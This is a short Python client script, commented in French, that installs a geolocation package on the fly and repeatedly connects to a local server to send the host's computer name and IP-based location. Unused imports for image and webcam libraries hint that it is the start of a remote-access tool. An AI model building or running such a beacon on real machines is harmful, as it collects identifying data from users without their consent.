import socket
import threading
from ip2geotools.databases.noncommercial import DbIpCity
import sys
import subprocess
import cv2
import time
import struct
import time
import pickle
import numpy as np
from PIL import Image

def ipLocation(ip):
    res = DbIpCity.get(ip, api_key="free")
    return (f'location:{res.city}, {res.region}, {res.country}').encode()


# BEGIN
HOST = '127.0.0.1'
PORT = 12345
clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# install package
subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'ip2geotools'])

while True:
    try:
        # Tentative de connexion au serveur
        clientSocket.connect((HOST, PORT))
        print('Connecté au serveur')

        # Envoi de données au serveur
        # clientSocket.sendall(b'Hello, world')
        IP = socket.gethostbyname(socket.gethostname())
        computerName = ("computerName:"+socket.gethostname()).encode()
        clientSocket.send(computerName)
        clientSocket.send(ipLocation(IP))

        # Réception de données du serveur
        data = clientSocket.recv(1024)
        print('Reçu', repr(data))
            
    except ConnectionRefusedError:
        # Si la connexion est refusée, attendez 5 secondes avant de réessayer
        print('Impossible de se connecter au serveur. Réessayer dans 5 secondes...')
        time.sleep(5)

    except Exception as e:
        # Si une erreur se produit, imprimez l'erreur et réessayer après 5 secondes
        print('Erreur:', e)
        time.sleep(5)
